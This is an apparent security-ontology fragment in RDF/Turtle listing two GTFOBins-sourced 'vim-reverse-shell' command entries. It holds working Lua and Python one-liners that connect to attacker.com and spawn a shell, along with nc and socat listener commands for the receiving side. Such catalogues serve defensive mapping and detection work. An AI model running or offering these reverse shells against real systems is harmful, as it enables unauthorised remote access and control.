    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed." ;
    d3f:uses mknd:executable_vim ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_vim ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
""" .

mknd:command_vim-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "vim-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_vim ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_vim ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
""" .

